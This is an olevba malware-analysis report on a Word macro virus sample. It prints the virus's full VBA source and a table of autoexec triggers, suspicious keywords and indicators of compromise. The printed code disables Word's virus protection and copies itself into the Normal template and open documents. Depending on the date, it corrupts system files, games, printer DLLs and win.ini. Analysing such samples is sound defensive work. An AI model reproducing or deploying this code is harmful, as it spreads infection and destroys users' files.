olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-04b3e30e34c971e8424e9b8781e4f6ff31825fda
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-04b3e30e34c971e8424e9b8781e4f6ff31825fda - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Karachi_y2k'
    Dim k As Single, a$, f As Boolean, i As Long, s$, x$, y$, pp As Integer
       On Error Resume Next
 Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Karachi_y2k'" Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Karachi_y2k'" Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    Next k
    If (Day(Now()) Mod 2 = 0) Then
        s$ = "C:\WINDOWS\SYSTEM\NETCPL.CPL": GoSub Chronicle
        s$ = "C:\WINDOWS\SYSTEM\INETCPL.CPL": GoSub Chronicle
        s$ = "C:\WINDOWS\SYSTEM\MODEM.CPL": GoSub Chronicle
        s$ = "C:\WINDOWS\SOL.EXE": GoSub Chronicle
        s$ = "C:\WINDOWS\MSHEARTS.EXE": GoSub Chronicle
        s$ = "C:\WINDOWS\FREECELL.EXE": GoSub Chronicle

   With Application.FileSearch
        .NewSearch
        .LookIn = "C:\"
        .SearchSubFolders = True
        .FileName = "*.MD?"
        .MatchTextExactly = False
        .FileType = msoFileTypeAllFiles
        If .Execute > 0 Then
        For k = 1 To .FoundFiles.Count
        s$ = Application.FileSearch.FoundFiles(k)
        GoSub Chronicle
        Next k
        End If
    End With

        If (Day(Now()) Mod 4 = 0) Then
            s$ = "C:\WINDOWS\SYSTEM\MSPRINT.DLL": GoSub Chronicle
            s$ = "C:\WINDOWS\SYSTEM\MSPRINT2.DLL": GoSub Chronicle
            If (Day(Now()) Mod 6 = 0) Then
                Open "c:\windows\win.ini" For Binary As 1
                Open "c:\windows\win.tm1" For Binary As 2
                Open "c:\windows\win.tm2" For Binary As 3
                s$ = "LPT"
                Put #3, , s$
                pp = 1
                x$ = "?": Get #3, pp, x$
                y$ = x$
                Do While Not EOF(1)
                    a$ = "?"
                    Get #1, , a$
                    If a$ = x$ Then
                        If pp = Len(s$) Then a$ = "D"
                        y$ = x$
                        pp = pp + 1
                        x$ = "?": Get #3, pp, x$
                    Else
                        pp = 1
                        x$ = "?": Get #3, pp, x$
                        y$ = x$
                    End If
                    Put #2, , a$
                Loop
                Close 3
                Close 2
                Close 1
                Kill "c:\windows\win.ini"
                Name "c:\windows\win.tm1" As "c:\windows\win.ini"
                Kill "c:\windows\win.tm2"
            End If
        End If
    End If
    Exit Sub
Chronicle:
Open s$ For Binary Shared As 1
For i = 4 To 1020
        pp = 0
        Get #1, i, pp
        pp = (pp And &HFF00) Or (255 - (pp And &HFF))
        Put #1, i, pp
Next
Close 1
Return
End Sub
Private Sub Document_Close()
'Karachi_y2k'
Document_Open
End Sub
Private Sub Document_New()
'Karachi_y2k'
Document_Open
End Sub
































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |NETCPL.CPL          |Executable file name                         |
|IOC       |INETCPL.CPL         |Executable file name                         |
|IOC       |MODEM.CPL           |Executable file name                         |
|IOC       |SOL.EXE             |Executable file name                         |
|IOC       |MSHEARTS.EXE        |Executable file name                         |
|IOC       |FREECELL.EXE        |Executable file name                         |
|IOC       |MSPRINT.DLL         |Executable file name                         |
|IOC       |MSPRINT2.DLL        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

